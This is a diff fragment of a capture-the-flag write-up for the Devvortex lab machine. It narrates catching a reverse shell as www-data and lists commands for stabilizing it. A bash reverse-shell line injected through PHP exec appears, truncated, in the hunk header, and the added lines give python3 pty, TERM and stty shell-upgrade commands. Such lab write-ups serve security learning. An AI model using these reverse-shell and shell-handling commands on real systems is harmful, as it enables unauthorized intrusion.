@@ -91,4 +91,18 @@ Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /de
 
 ![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46054c87-6b9e-42d8-b9b9-f686fc0709f4)
 
+I save the file, and back on my system, I get a connection and I now have access onto the devvortex server itself:
 
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/e03da5be-3d6a-4c5e-9434-445e56574380)
+
+# Shell as www-data
+
+First things first, I check to see if the server has python3, which I then use to stabilize the shell using the commands
+
+`python3 -c "import pty;pty.spawn('/bin/bash')"
+ export TERM=xterm
+ CTRL + Z
+ stty raw -echo; fg
+`
+
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/13c9ef47-316b-4cb9-8389-5ae8cace4854)
